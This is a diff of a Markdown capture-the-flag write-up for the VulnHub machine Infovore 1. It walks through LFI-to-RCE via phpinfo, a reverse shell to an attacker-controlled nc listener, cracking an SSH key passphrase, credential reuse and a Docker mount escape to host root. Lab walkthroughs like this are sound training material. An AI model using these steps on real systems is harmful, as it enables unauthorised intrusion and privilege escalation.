@@ -11,25 +11,25 @@ tags:
   - docker
   - ssh
   - capabilities
-machine: Infovore 1
+machine: Infovore
 platform: Linux
 difficulty: Easy/Intermediate
-date_solved: 2026-09-25
-key_techniques:
+date: 2026-09-25
+techniques:
   - LFI to RCE through PHP info and file upload
   - Docker escape
   - SSH key reuse
   - tar capability abuse
 cve: []
-initial_vector: LFI to RCE through PHP info and file upload
-privilege_escalation: Docker group escape and tar capability abuse
+initial vector: LFI to RCE through PHP info and file upload
+privilege escalation: Docker group escape and tar capability abuse
 author: null
-writeup_url: https://www.vulnhub.com/entry/infovore-1,496/
+source: https://www.vulnhub.com/entry/infovore-1,496/
 ---
 
 - **Infovore 1 machine**: [https://www.vulnhub.com/entry/infovore-1,496/](https://www.vulnhub.com/entry/infovore-1,496/)
 
-### Reconnaissance
+## Reconnaissance
 As always we start the recon phase with an *arp-scan* on the local network to detect the victim machine's IP.
 ```bash
 arp-scan -I ens33 --localnet
@@ -45,6 +45,9 @@ nmap --script http-enum -p80 192.168.18.240 -oN webScan
 We find a */include me* directory and an */info.php*. The latter gives us a lot of valuable info about the PHP version and future attack vectors, but for now we can't do much. *file_uploads* is on, which means we can achieve *LFI to RCE* by abusing this via a *POST* request.
 https://hacktricks.wiki/es/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html
 
+## Exploitation
+
+### LFI to RCE via phpinfo
 We open Burp Suite and intercept info.php, change the method from GET to POST and add a few plain-text lines.
 ```burpsuite
 POST /info.php HTTP/1.1
@@ -330,6 +333,7 @@ if __name__ == "__main__":
     print("Don't forget to modify the LFI URL")
     main()
 ```
+### Reverse shell
 Here we just need to add the attacker IP where it belongs, start a listener with nc on 443, and pass the machine's IP and port when running the script. That gives us a shell, and we proceed with the TTY upgrade:
 ```shell
 script /dev/null -c bash
@@ -343,7 +347,9 @@ stty rows 44 columns 184
 ```
 The user is *www-data*, and running *hostname -I* shows a different IP, which tells us we're inside a container.
 
-### Privilege escalation
+## Privilege escalation
+
+### Container root (linPEAS + key cracking)
 To escalate we'll need to escape the container. After trying the usual escalation paths — capabilities, config files, users with "sh$" access, files containing passwd... — nothing worked or turned up anything relevant.
 We proceed to use *linPEAS*, a tool allowed on the OSCP because it doesn't exploit, it only enumerates.
 ```bash
@@ -368,10 +374,13 @@ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
 The id_rsa gives us the word *choclate93*; with this password we can't connect over SSH to the main machine, but at least we can become root in the container.
 ![[Pasted image 20260925132650.png|Root in the container and first flag]]
 We get a first FLAG, but the goal is to escape the container.
+### Pivot to the host over SSH
 To reach the main machine, if we go to *~/.ssh* we'll find the SSH keys plus a *known_hosts* file listing the admin user, which suggests there may be a trust relationship between that user and the main machine thanks to the configured keys.
 We try to connect as the admin user to the main machine over SSH and hit credential reuse — *choclate93* in this case.
 ![[Pasted image 20260925133555.png|SSH access as admin to the main machine]]
 Now we'd need to escalate to root on the main machine.
+
+### Docker group escape to root
 We're in the Docker group, so we can create a container and, by abusing mounts, mount the entire system root inside a container, gaining full access to everything.
 ```bash
 docker run -dit -v /:/mnt/root --name privesc theart42/infovore
